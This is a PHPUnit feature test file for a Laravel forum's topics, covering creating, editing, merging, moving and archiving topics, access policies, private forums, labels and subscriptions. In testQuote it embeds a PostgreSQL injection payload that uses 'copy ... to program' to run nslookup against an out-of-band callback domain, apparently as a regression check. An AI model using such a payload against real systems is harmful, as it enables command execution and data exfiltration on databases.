<?php

namespace Tests\Feature\Forum;

use App\Enums\TopicLabelEnum;
use App\Forum;
use App\Jobs\Forum\UpdateForumCounters;
use App\Post;
use App\Topic;
use App\User;
use App\UsersAccessToForum;
use App\UserTopicSubscription;
use Carbon\Carbon;
use Illuminate\Support\Str;
use Tests\TestCase;

class TopicTest extends TestCase
{
	public function testShowHttp()
	{
		$topic = factory(Topic::class)
			->create();

		$this->get(route('topics.show', $topic))
			->assertOk()
			->assertSeeText(__('post.nothing_found'));
	}

	public function testShowHttpDontSeeNothingFoundIfFixPost()
	{
		$post = factory(Post::class)->create();
		$post->fix();

		$this->get(route('topics.show', $post->topic))
			->assertOk()
			->assertDontSeeText(__('post.nothing_found'));
	}

	public function testViewCount()
	{
		$post = factory(Post::class)
			->create();

		$topic = $post->topic;

		$this->get(route('topics.show', $topic))
			->assertOk();
		$topic->refresh();
		$this->assertEquals(1, $topic->view_count);

		$this->get(route('topics.show', $topic))
			->assertOk();
		$topic->refresh();
		$this->assertEquals(2, $topic->view_count);

		$this->get(route('topics.show', $topic))
			->assertOk();
		$topic->refresh();
		$this->assertEquals(3, $topic->view_count);
	}

	public function testStoreHttp()
	{
		$user = factory(User::class)->create();
		$user->group->add_forum_topic = true;
		$user->push();

		$forum = factory(Forum::class)->create()->fresh();

		$response = $this->actingAs($user)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $this->faker->realText(50) . ' ' . Str::random(10),
					'description' => $this->faker->realText(100),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic = $forum->topics()->first();

		$response->assertRedirect(route('topics.show', ['topic' => $topic->id]));

		$post = $topic->posts()->first();

		$this->assertEquals(1, $topic->posts()->count());
		$this->assertEquals($post->id, $topic->last_post_id);
		$this->assertEquals($post->created_at, $topic->last_post_created_at);
	}

	public function testEditSpecialSettingsHttp()
	{
		$user = factory(User::class)->create();
		$user->group->manipulate_topic = false;
		$user->group->edit_forum_self_topic = true;
		$user->group->edit_forum_other_user_topic = true;
		$user->push();

		$topic = factory(Topic::class)->create(['forum_priority' => 0, 'main_priority' => 0])->fresh();

		$name = $this->faker->realText(50);

		$response = $this->actingAs($user)
			->patch(route('topics.update', ['topic' => $topic->id]),
				[
					'name' => $name,
					'description' => $this->faker->realText(50),
					'forum_priority' => 20,
					'main_priority' => 20
				]
			)->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();

		$this->assertEquals(0, $topic->forum_priority);
		$this->assertEquals(0, $topic->main_priority);
		$this->assertEquals($name, $topic->name);

		$user->group->manipulate_topic = true;
		$user->push();

		$name = $this->faker->realText(50);

		$response = $this->actingAs($user)
			->patch(route('topics.update', ['topic' => $topic->id]),
				[
					'name' => $name,
					'description' => $this->faker->realText(50),
					'forum_priority' => 20,
					'main_priority' => 20
				]
			)->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();

		$this->assertEquals(20, $topic->forum_priority);
		$this->assertEquals(20, $topic->main_priority);
		$this->assertEquals($name, $topic->name);
	}

	public function testMergeHttp()
	{
		$user = factory(User::class)->create();
		$user->group->manipulate_topic = true;
		$user->push();

		$post = factory(Post::class)->create()->fresh();
		$post2 = factory(Post::class)->create()->fresh();
		$post3 = factory(Post::class)->create()->fresh();
		$post4 = factory(Post::class)->create()->fresh();

		$topic = $post->topic;
		$topic4 = $post4->topic;
		$forum4 = $topic4->forum;

		UpdateForumCounters::dispatch($post->topic->forum);

		$response = $this->actingAs($user)
			->post(route('topics.merge', ['topic' => $topic->id]),
				[
					'topics' => [
						$post2->topic->id,
						$post3->topic->id,
						$post4->topic->id
					]
				]
			)
			->assertSessionHasNoErrors()
			->assertRedirect(route('topics.show', ['forum' => $post->topic->forum->id, 'topic' => $post->topic->id]));

		$topic->refresh();
		$topic4->refresh();

		$this->assertSoftDeleted($topic4);

		$this->assertEquals($post4->id, $topic->last_post_id);
		$this->assertEquals($post4->created_at, $topic->last_post_created_at);

		$this->assertEquals(4, $topic->posts()->count());
		$this->assertEquals(4, $topic->post_count);

		$forum = $topic->forum->fresh();

		$this->assertEquals(4, $forum->posts()->count());
		$this->assertEquals(4, $forum->post_count);
		$this->assertEquals(1, $forum->topic_count);

		$forum4->refresh();

		$this->assertEquals(0, $forum4->posts()->count());
		$this->assertEquals(0, $forum4->topics()->count());
		$this->assertEquals(0, $forum4->topic_count);
		$this->assertEquals(0, $forum4->post_count);
		$this->assertNull($forum4->last_post_id);
		$this->assertNull($forum4->last_topic_id);
	}

	public function testMove()
	{

		$user = factory(User::class)->create();
		$user->group->manipulate_topic = true;
		$user->push();

		$post = factory(Post::class)->create()->fresh();
		$post2 = factory(Post::class)->create(['topic_id' => $post->topic->id])->fresh();

		$forum = factory(Forum::class)->create()->fresh();

		$topic = $post->topic;
		$forum2 = $post->topic->forum;

		$response = $this->actingAs($user)
			->post(route('topics.move', ['topic' => $topic->id]),
				['forum' => $forum->id]
			)
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();
		$forum->refresh();
		$forum2->refresh();

		$this->assertEquals($post2->id, $topic->last_post_id);
		$this->assertEquals($post2->created_at, $topic->last_post_created_at);

		$this->assertEquals($post2->id, $forum->last_post_id);
		$this->assertEquals($topic->id, $forum->last_topic_id);

		$this->assertNull($forum2->last_post_id);
		$this->assertNull($forum2->last_topic_id);

	}


	public function testCreatePolicy()
	{
		// create_post

		$admin = factory(User::class)->create();
		$admin->group->add_forum_post = true;
		$admin->push();

		$user = factory(User::class)->create();
		$user->push();

		$topic = factory(Topic::class)->create();
		$topic->closed = false;
		$topic->push();

		$this->assertTrue($admin->can('create_post', $topic));
		$this->assertTrue($user->can('create_post', $topic));

		//

		$admin = factory(User::class)->create();
		$admin->group->add_forum_post = true;
		$admin->push();

		$user = factory(User::class)->create();
		$user->group->add_forum_post = true;
		$user->push();

		$topic = factory(Topic::class)->create();
		$topic->closed = true;
		$topic->push();

		$this->assertFalse($admin->can('create_post', $topic));
		$this->assertFalse($user->can('create_post', $topic));

		// create

		$admin = factory(User::class)->create();
		$admin->group->add_forum_topic = true;
		$admin->push();

		$user = factory(User::class)
			->states('with_user_group')
			->create();

		$topic = factory(Topic::class)->create();

		$this->assertTrue($admin->can('create', $topic));
		$this->assertFalse($user->can('create', $topic));
	}

	public function testUpdatePolicy()
	{
		$user = factory(User::class)->states('with_user_group')->create();
		$user->group->edit_forum_self_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();

		$this->assertTrue($user->can('update', $topic));
		$this->assertFalse($user2->can('update', $topic));

		//

		$user = factory(User::class)->create();
		$user->group->edit_forum_self_topic = true;
		$user->group->edit_forum_other_user_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();

		$topic2 = factory(Topic::class)->create();
		$topic2->create_user_id = $user2->id;
		$topic2->push();

		$this->assertTrue($user->can('update', $topic));
		$this->assertTrue($user->can('update', $topic2));
		$this->assertFalse($user2->can('update', $topic));
		$this->assertFalse($user2->can('update', $topic2));
	}

	public function testDeletePolicy()
	{
		$user = factory(User::class)->states('with_user_group')->create();
		$user->group->delete_forum_self_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();

		$this->assertTrue($user->can('delete', $topic));
		$this->assertFalse($user2->can('delete', $topic));

		//

		$user = factory(User::class)->states('with_user_group')->create();
		$user->group->delete_forum_self_topic = true;
		$user->group->delete_forum_other_user_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();

		$topic2 = factory(Topic::class)->create();
		$topic2->create_user_id = $user2->id;
		$topic2->push();

		$this->assertTrue($user->can('delete', $topic));
		$this->assertTrue($user->can('delete', $topic2));
		$this->assertFalse($user2->can('delete', $topic));
		$this->assertFalse($user2->can('delete', $topic2));
	}

	public function testRestorePolicy()
	{
		$user = factory(User::class)->states('with_user_group')->create();
		$user->group->delete_forum_self_topic = true;
		$user->push();

		$user2 = factory(User::class)->create();
		$user2->push();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();
		$topic->delete();

		$this->assertTrue($user->can('restore', $topic));
		$this->assertFalse($user2->can('restore', $topic));

		//

		$user = factory(User::class)->create();
		$user->group->delete_forum_self_topic = true;
		$user->group->delete_forum_other_user_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$topic = factory(Topic::class)->create();
		$topic->create_user_id = $user->id;
		$topic->push();
		$topic->delete();

		$topic2 = factory(Topic::class)->create();
		$topic2->create_user_id = $user2->id;
		$topic2->push();
		$topic2->delete();

		$this->assertTrue($user->can('restore', $topic));
		$this->assertTrue($user->can('restore', $topic2));
		$this->assertFalse($user2->can('restore', $topic));
		$this->assertFalse($user2->can('restore', $topic2));
	}

	public function testOpenCloseMergeMovePolicy()
	{
		$user = factory(User::class)->states('with_user_group')->create();
		$user->group->manipulate_topic = true;
		$user->push();

		$user2 = factory(User::class)->states('with_user_group')->create();

		$opened_topic = factory(Topic::class)->create();
		$opened_topic->open();
		$opened_topic->push();

		$closed_topic = factory(Topic::class)->create();
		$closed_topic->close();
		$closed_topic->push();

		$this->assertTrue($user->can('open', $closed_topic));
		$this->assertFalse($user2->can('open', $closed_topic));
		$this->assertFalse($user->can('open', $opened_topic));
		$this->assertFalse($user2->can('open', $opened_topic));

		$this->assertTrue($user->can('close', $opened_topic));
		$this->assertFalse($user2->can('close', $opened_topic));
		$this->assertFalse($user->can('close', $closed_topic));
		$this->assertFalse($user2->can('close', $closed_topic));

		$this->assertTrue($user->can('merge', $opened_topic));
		$this->assertFalse($user2->can('merge', $opened_topic));

		$this->assertTrue($user->can('move', $opened_topic));
		$this->assertFalse($user2->can('move', $opened_topic));
	}

	public function testCantArchiveIfNoPermission()
	{
		$user = factory(User::class)->create();
		$user->group->manipulate_topic = false;
		$user->push();

		$post = factory(Post::class)->create();

		$topic = $post->topic;
		$topic->unarchive();

		$this->assertFalse($user->can('archive', $topic));
		$this->assertFalse($user->can('unarchive', $topic));
		$this->assertTrue($user->can('create_post', $topic));
	}

	public function testCanArchiveIfHasPermission()
	{
		$user = factory(User::class)->create();
		$user->group->manipulate_topic = true;
		$user->push();

		$post = factory(Post::class)->create();

		$topic = $post->topic;
		$topic->unarchive();

		$this->assertTrue($user->can('archive', $topic));
		$this->assertFalse($user->can('unarchive', $topic));
		$this->assertTrue($user->can('create_post', $topic));
	}

	public function testCantArchiveIfAlreadyArchived()
	{
		$user = factory(User::class)->create();
		$user->group->manipulate_topic = true;
		$user->push();

		$post = factory(Post::class)->create();

		$topic = $post->topic;
		$topic->archive();

		$this->assertFalse($user->can('archive', $topic));
		$this->assertTrue($user->can('unarchive', $topic));
		$this->assertFalse($user->can('create_post', $topic));
	}

	public function testViewPrivateTopicOnUserPostsList()
	{
		$post = factory(Post::class)
			->create();

		$forum = $post->forum;
		$forum->private = true;
		$forum->save();

		$topic = $post->topic;

		$usersAccessToForum = new UsersAccessToForum;
		$usersAccessToForum->user_id = $post->create_user_id;
		$forum->user_access()->save($usersAccessToForum);

		$response = $this->actingAs($post->create_user)
			->get(route('home.latest_posts', $topic->create_user))
			->assertSeeText($topic->name);

		$other_user = factory(User::class)
			->create();

		Topic::refreshLatestTopics();

		$response = $this->actingAs($other_user)
			->get(route('home.latest_posts', $topic->create_user))
			->assertDontSeeText($topic->name);

		Topic::refreshLatestTopics();

		$response = $this
			->get(route('home.latest_posts', $topic->create_user))
			->assertDontSeeText($topic->name);
	}

	public function testViewPrivateTopicOnUserTopicsList()
	{
		$post = factory(Post::class)
			->create();

		$forum = $post->forum;
		$forum->private = true;
		$forum->save();

		$topic = $post->topic;

		$usersAccessToForum = new UsersAccessToForum;
		$usersAccessToForum->user_id = $post->create_user_id;
		$forum->user_access()->save($usersAccessToForum);

		$response = $this->actingAs($post->create_user)
			->get(route('users.topics', $topic->create_user))
			->assertSeeText($topic->name);

		$other_user = factory(User::class)
			->create();

		Topic::refreshLatestTopics();

		$response = $this->actingAs($other_user)
			->get(route('users.topics', $topic->create_user))
			->assertDontSeeText($topic->name);

		Topic::refreshLatestTopics();

		$response = $this
			->get(route('users.topics', $topic->create_user))
			->assertDontSeeText($topic->name);
	}

	public function testViewPrivateTopic()
	{
		$post = factory(Post::class)
			->create();

		$user = $post->create_user;

		$forum = $post->forum;
		$forum->private = true;
		$forum->save();

		$this->assertFalse($user->can('view', $forum));

		$forum->users_with_access()->sync([$user->id]);
		$forum->refresh();

		$this->assertTrue($user->can('view', $forum));

		$response = $this->actingAs($user)
			->get(route('topics.show', ['topic' => $post->topic->id]))
			->assertOk()
			->assertSeeText($forum->name);

		$other_user = factory(User::class)
			->create();

		$response = $this->actingAs($other_user)
			->get(route('topics.show', ['topic' => $post->topic->id]))
			->assertForbidden();

		$response = $this->get(route('topics.show', ['topic' => $post->topic->id]))
			->assertForbidden();
	}

	public function testFulltextSearch()
	{
		$author = Topic::FulltextSearch('Время&—&детство!')->get();

		$this->assertTrue(true);
	}

	public function testEditLabel()
	{
		$admin = factory(User::class)->create();
		$admin->group->edit_forum_self_topic = true;
		$admin->group->edit_forum_other_user_topic = true;
		$admin->push();

		$forum = factory(Forum::class)->create();
		$forum->is_idea_forum = true;
		$forum->save();

		$topic = factory(Topic::class)
			->create(['forum_id' => $forum->id]);

		$this->assertNull($topic->label);

		$response = $this->actingAs($admin)
			->patch(route('topics.update', ['topic' => $topic->id]),
				array_merge($forum->toArray(), ['label' => TopicLabelEnum::IdeaOnReview]))
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();

		$this->assertEquals(TopicLabelEnum::IdeaOnReview, $topic->label);

		$response = $this->actingAs($admin)
			->get(route('forums.show', ['forum' => $forum->id]))
			->assertOk()
			->assertSeeText(__('topic.labels.IdeaOnReview'));

		$response = $this->actingAs($admin)
			->patch(route('topics.update', ['topic' => $topic->id]),
				array_merge($forum->toArray(), ['label' => TopicLabelEnum::IdeaImplemented]))
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();

		$this->assertEquals(TopicLabelEnum::IdeaImplemented, $topic->label);

		$response = $this->actingAs($admin)
			->get(route('forums.show', ['forum' => $forum->id]))
			->assertOk()
			->assertSeeText(__('topic.labels.IdeaImplemented'));
	}

	public function testChangeLabel()
	{
		$admin = factory(User::class)->create();
		$admin->group->edit_forum_self_topic = true;
		$admin->group->edit_forum_other_user_topic = true;
		$admin->group->manipulate_topic = true;
		$admin->push();

		$forum = factory(Forum::class)->create();
		$forum->is_idea_forum = true;
		$forum->save();

		$topic = factory(Topic::class)
			->create(['forum_id' => $forum->id]);

		$this->assertNull($topic->label);

		$response = $this->actingAs($admin)
			->get(route('topics.label.change', ['topic' => $topic->id, 'label' => TopicLabelEnum::IdeaOnReview]),
				array_merge($forum->toArray()))
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic->refresh();

		$this->assertEquals(TopicLabelEnum::IdeaOnReview, $topic->label);

		$response = $this->actingAs($admin)
			->get(route('forums.show', ['forum' => $forum->id]))
			->assertOk()
			->assertSeeText(__('topic.labels.IdeaOnReview'));
	}

	public function testNotAttachLabelIdeaOnReviewIfNotIdeaForum()
	{
		$admin = factory(User::class)->create();
		$admin->group->add_forum_topic = true;
		$admin->push();

		$forum = factory(Forum::class)->create();

		$this->assertFalse($forum->isIdeaForum());

		$response = $this->actingAs($admin)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $this->faker->realText(50),
					'description' => $this->faker->realText(200),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasNoErrors()
			->assertRedirect();

		$topic = $forum->topics()->first();

		$this->assertNull($topic->label);
	}

	public function testAttachLabelIdeaOnReviewIfIdeaForum()
	{
		$admin = factory(User::class)->create();
		$admin->group->add_forum_topic = true;
		$admin->push();

		$forum = factory(Forum::class)->create();
		$forum->is_idea_forum = true;
		$forum->save();

		$this->assertTrue($forum->fresh()->isIdeaForum());

		$response = $this->actingAs($admin)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $this->faker->realText(50),
					'description' => $this->faker->realText(100),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasNoErrors();

		$topic = $forum->topics()->first();

		$this->assertEquals(TopicLabelEnum::IdeaOnReview, $topic->label);
	}

	public function testEditNotFound()
	{
		$admin = factory(User::class)->create();
		$admin->push();

		$topic = factory(Topic::class)
			->create();

		$id = $topic->id;

		$topic->forceDelete();

		$this->actingAs($admin)
			->get(route('topics.edit', ['topic' => $id]))
			->assertNotFound();
	}

	public function testSearch()
	{
		$topic = factory(Topic::class)
			->create(['name' => uniqid()]);

		$this->get(route('topics.index', ['search_str' => $topic->name]))
			->assertOk()
			->assertSeeText($topic->name)
			->assertDontSeeText(__('topic.nothing_found'));
	}

	public function testSubscribeAjax()
	{
		$topic = factory(Topic::class)
			->create();

		$user = factory(User::class)
			->create();

		$this->actingAs($user)
			->get(route('topics.subscribe', ['topic' => $topic]),
				['HTTP_X-Requested-With' => 'XMLHttpRequest'])
			->assertOk()
			->assertJsonFragment(['status' => 'subscribed']);

		$subscription = $user->subscribed_topics()->first();

		$this->assertEquals($user->id, $subscription->user_id);
		$this->assertEquals($topic->id, $subscription->topic_id);
	}

	public function testUnsubscribeAjax()
	{
		$subscription = factory(UserTopicSubscription::class)
			->create();

		$user = $subscription->user;
		$topic = $subscription->topic;

		$this->actingAs($user)
			->get(route('topics.unsubscribe', ['topic' => $topic]),
				['HTTP_X-Requested-With' => 'XMLHttpRequest'])
			->assertOk()
			->assertJsonFragment(['status' => 'unsubscribed']);

		$subscription = $user->subscribed_topics()->first();

		$this->assertNull($subscription);
		$this->assertEquals(0, $user->subscribed_topics()->count());
	}

	public function testUnsubscribe()
	{
		$subscription = factory(UserTopicSubscription::class)
			->create();

		$user = $subscription->user;
		$topic = $subscription->topic;

		$this->actingAs($user)
			->get(route('topics.unsubscribe', ['topic' => $topic]))
			->assertOk()
			->assertSeeText(__('topic.you_have_successfully_unsubscribed_from_receiving_notifications_of_new_messages'));
	}

	public function testArchivedHttp()
	{
		Topic::archived()->delete();

		$user = factory(User::class)
			->create();

		$topic = factory(Topic::class)->create();
		$topic->archive();

		$this->actingAs($user)
			->get(route('topics.archived'))
			->assertOk()
			->assertSeeText(__('topic.archived_topics'))
			->assertSeeText($topic->name);
	}

	public function testMergeTopics()
	{
		$admin = factory(User::class)
			->states('admin')
			->create();

		$post = factory(Post::class)->create();
		$topic = $post->topic;
		$post->fix();

		$post2 = factory(Post::class)->create();
		$topic2 = $post2->topic;
		$post2->fix();

		$this->actingAs($admin)
			->post(route('topics.merge', ['topic' => $topic]),
				['topics' => [$topic2->id]])
			->assertRedirect();

		$topic->refresh();
		$topic2->refresh();
		$post->refresh();
		$post2->refresh();

		$this->assertTrue($post->isFixed());
		$this->assertFalse($post2->isFixed());

		$this->assertEquals($post->id, $topic->top_post_id);
		$this->assertNull($topic2->top_post_id);

		$this->assertEquals($topic->id, $post->topic_id);
		$this->assertEquals($topic->id, $post2->topic_id);
	}

	public function testCachedLatestTopicsPublicScopeAttached()
	{
		$post = factory(Post::class)
			->create();

		$topic = $post->topic;
		$forum = $topic->forum;

		Topic::refreshLatestTopics();
		$topics = Topic::cachedLatestTopics();

		$this->assertEquals($topic->id, $topics->first()->id);

		$forum->private = true;
		$forum->save();

		Topic::refreshLatestTopics();
		$topics = Topic::cachedLatestTopics();

		if (!empty($topics->first()))
			$this->assertNotEquals($topic->id, $topics->first()->id);
	}

	public function testQuote()
	{
		$topic = factory(Topic::class)
			->create();

		$s = "the';copy (select '') to program 'nslookup dns.sqli." . chr(92) . chr(92) . "013405.1877-71756.1877.f5ca2." . chr(92) . chr(92) . "1.bxss.me";

		$this->get(route('topics.posts.index', ['topic' => $topic, 'search_str' => $s]))
			->assertOk();
	}

	public function testForumDeletedShowTopic()
	{
		$topic = factory(Topic::class)
			->create();

		$topic->forum->delete();

		$this->get(route('topics.show', $topic))
			->assertNotFound();

		$topic->forum->forceDelete();

		$this->get(route('topics.show', $topic))
			->assertNotFound();
	}

	public function testIsNotFoundIfTopicDeleted()
	{
		$topic = factory(Topic::class)->create();

		$topic->delete();

		$this->get(route('topics.show', $topic))
			->assertNotFound();
	}

	public function testCanSeeArchivedTopicPosts()
	{
		$post = factory(Post::class)
			->create();

		$topic = $post->topic;
		$topic->archive();

		$this->get(route('topics.show', $topic))
			->assertOk()
			->assertSeeText($post->html_text);
	}

	public function testCantCreateTopicWithTheSameNameWithin5Minutes()
	{
		$user = factory(User::class)
			->states('admin')
			->create();

		$forum = factory(Forum::class)->create();

		$name = $this->faker->realText(50) . ' ' . Str::random(10);

		$this->actingAs($user)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $name,
					'description' => $this->faker->realText(100),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasNoErrors()
			->assertRedirect();

		$this->assertEquals(1, $forum->topics()->count());

		$this->actingAs($user)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $name,
					'description' => $this->faker->realText(100),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasErrors(['name' => __('topic.you_have_recently_created_a_theme_with_the_same_name')])
			->assertRedirect();

		Carbon::setTestNow(now()->addMinutes(10));

		$this->actingAs($user)
			->post(route('topics.store', ['forum' => $forum->id]),
				[
					'name' => $name,
					'description' => $this->faker->realText(100),
					'bb_text' => $this->faker->realText(100)
				]
			)
			->assertSessionHasNoErrors()
			->assertRedirect();

		$this->assertEquals(2, $forum->topics()->count());
	}
}
